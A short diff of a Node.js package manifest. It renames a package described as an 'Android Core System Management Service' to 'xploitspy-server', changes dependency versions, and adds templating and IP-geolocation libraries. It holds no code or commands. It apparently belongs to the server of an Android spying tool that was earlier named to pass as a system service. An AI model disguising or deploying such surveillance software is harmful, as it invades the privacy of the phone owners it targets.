@@ -1,13 +1,15 @@
 {
-  "name": "system-core-service",
+  "name": "xploitspy-server",
   "version": "3.0.0",
-  "description": "Android Core System Management Service",
+  "description": "XploitSPY Core System Management",
   "main": "index.js",
   "scripts": {
     "start": "node index.js"
   },
   "dependencies": {
-    "express": "^4.22.3",
-    "socket.io": "^4.8.4"
+    "express": "^4.19.2",
+    "socket.io": "^4.7.5",
+    "ejs": "^3.1.9",
+    "geoip-lite": "^1.4.7"
   }
 }
